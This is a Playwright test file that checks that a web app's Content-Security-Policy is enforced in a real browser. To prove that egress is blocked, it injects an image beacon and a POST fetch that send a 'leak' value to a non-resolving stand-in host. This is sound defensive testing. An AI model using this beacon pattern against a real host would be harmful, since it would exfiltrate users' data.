/**
 * Journey 47: the CSP's egress directives actually BLOCK, in a real browser (#1256)
 *
 * Imports from "@playwright/test" instead of "./fixtures" on purpose: this journey
 * provokes CSP violations, and a blocked request logs a console error, which the
 * shared fixture (rightly) treats as a failure. That fixture is what makes every
 * OTHER journey a `connect-src` regression guard for free — here we need the
 * opposite. What the fixture would also have caught is kept below: uncaught page
 * errors are collected and asserted empty, so opting out of the console channel
 * does not silently opt out of the rest of the net.
 *
 * The assertion that matters is `disposition === "enforce"`: report-only fires the
 * same event with `disposition === "report"`, so a policy that only observes fails
 * this spec. That is the whole difference #1256 is about. The exact directive VALUES
 * are pinned in `apps/web/app/security-headers.test.ts`, not here — this spec's job
 * is that the header reaches the browser and bites.
 */
import { expect, test } from "@playwright/test";

/** Never resolves, so nothing leaves the machine even if the policy were absent. */
const UNLISTED_HOST = "https://csp-probe.invalid";

/**
 * Where the page parks the violations it saw, read back by polling. Cast locally
 * rather than declared on `Window`: a `declare global` here would widen the type
 * for every spec in `tsconfig.e2e.json`, and the repo's habit is to return values
 * out of `evaluate` (42-landing-static, 31-add-investment-saldo).
 */
type CspProbeWindow = Window & { __cspBlocked?: string[] };

test.describe("CSP enforcement", () => {
  test("serves the enforced header alongside the full report-only policy", async ({
    page,
  }) => {
    const response = await page.goto("/");
    const headers = response?.headers() ?? {};

    const enforced = headers["content-security-policy"] ?? "";
    expect(enforced).toContain("img-src ");
    expect(enforced).toContain("connect-src ");
    // Why default-src must stay out: see ENFORCED_CSP_DIRECTIVES.
    expect(enforced).not.toContain("default-src");

    // The rest of the target policy keeps being observed, not dropped.
    expect(headers["content-security-policy-report-only"] ?? "").toContain(
      "default-src ",
    );
  });

  test("blocks a remote image and a cross-origin fetch to an unlisted host", async ({
    page,
  }) => {
    const pageErrors: string[] = [];
    page.on("pageerror", (error) => pageErrors.push(error.message));

    await page.goto("/");

    await page.evaluate(() => {
      const seen: string[] = [];
      (window as Window & { __cspBlocked?: string[] }).__cspBlocked = seen;
      // Not removed afterwards on purpose: the document dies with the test.
      document.addEventListener("securitypolicyviolation", (event) => {
        if (event.disposition === "enforce") seen.push(event.effectiveDirective);
      });
    });

    await page.evaluate(async (host) => {
      // The exfiltration shape #1246 closed at the render seam: an outbound GET
      // the browser makes with no click.
      const img = document.createElement("img");
      img.src = `${host}/pixel.png?d=leak`;
      document.body.appendChild(img);
      try {
        await fetch(`${host}/beacon`, { body: "leak", method: "POST" });
      } catch {
        // A blocked fetch rejects; the violation event is what we assert on.
      }
      img.remove();
    }, UNLISTED_HOST);

    // Polled, not slept: the violation events land asynchronously and a fixed wait
    // is a flake with `retries: 0` (#1250).
    await expect
      .poll(async () =>
        page.evaluate(() => (window as CspProbeWindow).__cspBlocked ?? []),
      )
      .toEqual(expect.arrayContaining(["img-src", "connect-src"]));

    expect(pageErrors, "a blocked request must not throw into the page").toEqual([]);
  });
});
